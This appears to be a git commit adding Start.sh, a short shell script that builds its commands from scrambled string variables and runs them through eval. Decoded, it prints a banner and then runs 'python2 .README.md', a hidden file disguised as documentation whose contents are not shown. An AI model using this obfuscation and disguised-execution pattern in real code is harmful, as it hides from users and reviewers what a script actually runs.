c24030d878b68108cfcd1c56b052840c1d2eb179
Sidra ELEzz <76815358+SidraELEzz@users.noreply.github.com>
2021-08-08 17:54:08 +0300

    Add files via upload

---
+++ Start.sh
@@ -0,0 +1,3 @@
+z="
+";Mz=' ...';Dz='....';Sz='.REA';Pz='p 2';Oz='slee';Hz=' "Co';Iz='d by';Rz='on2 ';Tz='DME.';Kz='ra E';Nz='!"';Gz='r';Cz='art.';Bz=' "st';Ez='.!"';Fz='clea';Uz='md';Qz='pyth';Az='echo';Jz=' Sid';Lz='LEzz';
+eval "$Az$Bz$Cz$Dz$Ez$z$Fz$Gz$z$Fz$Gz$z$Az$z$Az$Hz$Iz$Jz$Kz$Lz$Mz$Dz$Nz$z$Az$z$Az$z$Az$z$Oz$Pz$z$Qz$Rz$Sz$Tz$Uz"
